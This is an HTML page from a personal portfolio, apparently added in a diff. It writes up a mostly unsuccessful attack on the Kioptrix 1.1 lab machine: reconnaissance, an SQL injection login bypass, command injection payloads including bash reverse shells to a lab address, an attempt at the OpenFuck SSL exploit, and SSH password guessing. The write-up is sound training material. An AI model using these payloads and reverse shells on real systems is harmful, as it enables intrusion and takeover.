@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&family=Rajdhani:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <title>Kioptrix 1.1 | The Epic Struggle</title>
+</head>
+<body>
+
+<nav class="navbar">
+    <a class="logo" href="../index.html">ROOT ACCESS</a>
+    <ul class="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#resume">Resume</a></li>
+        <li><a href="../index.html#projects">Projects</a></li>
+        <li><a href="../walkthroughs.html">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+<main class="writeup-container">
+    <!-- HERO SECTION -->
+    <div class="writeup-hero">
+        <span class="difficulty-badge">THE STRUGGLE IS REAL</span>
+        <h1>Kioptrix Level 1.1 (#2)</h1>
+        <p class="machine-meta">CentOS 4.5 · Apache 2.0.52 · SQLi · Command Injection · SSLv2 · SSH · The Full Monty</p>
+        <div class="attack-summary">
+            <p>This is the story of how I threw everything at a 15-year-old box and it fought back. SQL injection, broken HTML, command injection, SSLv2 exploits, SSH brute force — this box said "not today, my friend." But the journey was legendary.</p>
+        </div>
+    </div>
+
+    <!-- EXECUTIVE ABSTRACT -->
+    <div class="executive-abstract">
+        <h2>🎯 Executive Abstract</h2>
+        <p><strong>What Was Accomplished:</strong> SQL injection bypass, HTML form repair, command injection testing, SSLv2 enumeration, SSH protocol analysis, and the discovery that sometimes old boxes are just broken.</p>
+        <p><strong>The Challenge:</strong> Every single exploit path failed. Samba wasn't running, SSH required ancient crypto, OpenFuck choked on OpenSSL 3.0, and the command injection vector was a ghost. The box was a fortress of obsolescence.</p>
+        <p><strong>Why This Has Immense Value:</strong> Real pentesting isn't always successful. Knowing when to pivot, documenting failures, and extracting lessons from blockers is a critical skill. This box demonstrated SQLi, frontend debugging, and the importance of environment validation.</p>
+        <p><strong>Time Invested:</strong> ~8 hours of pure grind | <strong>Status:</strong> Moved to the "I'll Remember You" folder</p>
+    </div>
+
+    <!-- PHASE 1: RECONNAISSANCE -->
+    <section class="phase">
+        <h2>📡 Phase 1: Reconnaissance</h2>
+        <p>Initial Nmap scan identified the target on the host-only network:</p>
+        <pre><code>nmap 192.168.56.0/24</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/nmap-scan.png" alt="Nmap scan showing open ports">
+            <p>Figure 1: Target discovered at 192.168.56.112 with ports 22, 80, 443, 3306.</p>
+        </div>
+
+        <p>Detailed service scan revealed:</p>
+        <pre><code>nmap -sC -sV 192.168.56.112
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
+443/tcp  open  ssl/https? SSLv2 supported with export ciphers
+3306/tcp open  mysql      MySQL (unauthorized - localhost only)</code></pre>
+    </section>
+
+    <!-- PHASE 2: SQL INJECTION -->
+    <section class="phase">
+        <h2>🔓 Phase 2: SQL Injection - Authentication Bypass</h2>
+        <p>The login page at <code>/index.php</code> was vulnerable to SQL injection.</p>
+        <pre><code>Username: admin'/*
+Password: admin'/*</code></pre>
+        <p>Successful login redirected to <code>/pingit.php</code> (Administrative Web Console).</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/sqli-bypass.png" alt="SQL injection login bypass">
+            <p>Figure 2: Admin login bypassed with 'admin'/*'</p>
+        </div>
+    </section>
+
+    <!-- PHASE 3: BROKEN HTML -->
+    <section class="phase">
+        <h2>🔧 Phase 3: The Broken HTML Form</h2>
+        <p>The <code>pingit.php</code> page rendered without an input field or submit button. Source code analysis revealed an unclosed <code>&lt;center&gt;</code> tag breaking the DOM.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/broken-html.png" alt="Broken HTML form before fix">
+            <p>Figure 3: Ping page with missing input field.</p>
+        </div>
+        
+        <p>Using Firefox DevTools, the HTML was edited live to inject:</p>
+        <pre><code>        &lt;input type="text" name="ip" size="20"&gt;
+        &lt;input type="submit" value="Ping"&gt;</code></pre>
+        
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/fixed-html.png" alt="Fixed HTML form with working Ping button">
+            <p>Figure 4: HTML fixed via DevTools - Ping button now visible.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 4: COMMAND INJECTION -->
+    <section class="phase">
+        <h2>💣 Phase 4: The Great Command Injection Saga</h2>
+        <p>Multiple payloads were tested via the ping form and curl:</p>
+        
+        <h3>Payloads Tested (All Failed)</h3>
+        <pre><code># Semicolon
+127.0.0.1; whoami
+;bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
+
+# Pipe
+127.0.0.1 | whoami
+| bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
+
+# URL Encoded
+127.0.0.1%3Bwhoami
+127.0.0.1%7Cwhoami
+
+# Backticks and Subshell
+`whoami`
+$(whoami)
+
+# The Kitchen Sink
+;id; ;whoami; ;ls -la; ;pwd;
+</code></pre>
+
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/curl-failures.png" alt="Terminal showing curl attempts">
+            <p>Figure 5: Multiple curl attempts - no command execution detected.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 5: SSLv2 ATTEMPT -->
+    <section class="phase">
+        <h2>🔐 Phase 5: The SSLv2 Nightmare</h2>
+        <p>SSLv2 was confirmed with export ciphers. Time for OpenFuck!</p>
+        
+        <pre><code># OpenFuck compilation attempt
+gcc -o openluck OpenFuck.c -lcrypto -lssl -ldl
+# 274 deprecated warnings later...
+
+# The final attempt
+./openluck 0x6a 192.168.56.112 443 -c 45
+get server verify: Malformed packet size AGAIN AND AGAIN AND AGAIN</code></pre>
+
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/openfuck-fail.png" alt="OpenFuck failing with OpenSSL 3.0">
+            <p>Figure 6: OpenSSL 3.0 said "not today" to our 15-year-old exploit.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 6: SSH ATTEMPT -->
+    <section class="phase">
+        <h2>🔑 Phase 6: The SSH Time Machine</h2>
+        <p>OpenSSH 3.9p1 required ancient crypto. Time to break out the old protocols:</p>
+        
+        <pre><code>ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@192.168.56.112
+
+# The response:
+Connection closed by 192.168.56.112 port 22
+# We found the user "test" exists!
+# But no password worked - not test, password, toor, admin, or 123456</code></pre>
+
+        <div class="image-card">
+            <img src="../Imgs/kioptrix/cat.jpg" alt="SSH connection with old protocols">
+            <p>Figure 7: We got past the handshake but never got in.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 7: THE FINAL CONCLUSION -->
+    <section class="phase conclusion">
+        <h2>🏆 The Final Verdict</h2>
+        
+        <div class="executive-abstract">
+            <h3>🎯 What We Actually Did</h3>
+            <ul>
+                <li><strong>SQL Injection</strong> — Admin bypass with <code>admin'/*</code></li>
+                <li><strong>HTML Repair</strong> — Fixed broken DOM in DevTools</li>
+                <li><strong>Command Injection</strong> — Tested every separator known to man</li>
+                <li><strong>SSLv2 Exploitation</strong> — OpenFuck compiled but failed due to OpenSSL 3.0</li>
+                <li><strong>SSH Enumeration</strong> — Confirmed user "test" exists, but password unknown</li>
+                <li><strong>Samba Enumeration</strong> — Ports 139/445 were closed (Samba not running)</li>
+            </ul>
+        </div>
+
+        <h3>📌 The Real Lesson</h3>
+        <div class="executive-abstract">
+            <p>This box was a fortress of obsolescence. Every modern tool failed. Every exploit was deprecated. Every path was blocked.</p>
+            <p><strong>But I learned more from this failure than from 10 successful boxes.</strong></p>
+            <ul>
+                <li><strong>OpenSSL 3.0 killed OpenFuck</strong> — Sometimes the tools age out</li>
+                <li><strong>Modern SSH won't talk to ancient SSH</strong> — Forcing protocols is a skill</li>
+                <li><strong>Sometimes the box is just broken</strong> — Pivoting is the real skill</li>
+                <li><strong>The struggle is the learning</strong> — 8 hours of no shell = 8 hours of growth</li>
+            </ul>
+        </div>
+
+        <h3>🎯 What Would I Do Differently?</h3>
+        <ul>
+            <li><strong>Kali VM with OpenSSL 1.1.1</strong> — Would have made OpenFuck work</li>
+            <li><strong>Check VMWare version</strong> — Different Kioptrix images have different vulns</li>
+            <li><strong>Try the metasploit mod_ssl module</strong> — Instead of fighting compilation</li>
+            <li><strong>Use Nmap's --script vuln</strong> — Could have found the exact path faster</li>
+        </ul>
+        
+        <div class="executive-abstract" style="margin-top: 2rem; border-color: #ff6b00;">
+            <h3 style="color: #ff6b00;">💀 The Final Word</h3>
+            <p style="font-size: 1.1rem; font-style: italic; text-align: center;">
+                "I came, I saw, I got owned by a 15-year-old CentOS box. <br>
+                But damn, what a ride."
+            </p>
+            <p style="text-align: center; margin-top: 1rem;">
+                <strong>GOONIES NEVER SAY DIE!</strong> 🏴‍☠️
+            </p>
+        </div>
+        
+        <a href="../walkthroughs.html" class="btn-back">← Back to Walkthroughs</a>
+    </section>
+</main>
+
+<footer>
+    <p>© 2025 ROOT ACCESS | Built for offensive security professionals</p>
+</footer>
+
+</body>
+</html>
